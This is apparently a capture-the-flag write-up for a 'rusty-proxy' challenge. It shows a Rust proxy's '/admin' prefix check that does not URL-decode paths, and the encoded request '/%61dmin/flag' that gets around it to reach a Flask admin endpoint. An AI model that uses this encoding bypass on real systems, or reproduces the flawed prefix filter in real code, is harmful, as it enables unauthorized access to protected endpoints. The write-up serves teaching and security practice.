#### rusty-proxy
- points earned: 50
#### Where's the flag?
- The flag is returned in the response of a request to `/admin/flag`
	```python
	@app.route('/admin/flag')
	def vault():
	    return jsonify({"flag": FLAG})
	```
#### Notes / Intuition
- The rust proxy will return a 403 response if the a request starts with `/admin`.
	```rust
	fn is_path_allowed(path: &str) -> bool {
	    let normalized = path.to_lowercase();
	    if normalized.starts_with("/admin") {
	        return false;
	    }
	    true
	}
	```
- However, the rust proxy does not properly validate the requested path.  More specifically, it does not URL decode the path.
- Flask properly handles requests where the path contains url encoded characters.  For example, if I send the below request directly to the `server.py` app then it replies with the status as expected.
	```http
	GET /%61pi/status HTTP/1.1
	Host: me:8080
	
	
	```
- This fact can be used to bypass the rust proxy because `'/%61dmin' != '/admin'`
#### Solution
- send the request below to the target challenge server
	```http
	GET /%61dmin/flag HTTP/1.1
	Host: me:8899
	
	
	```
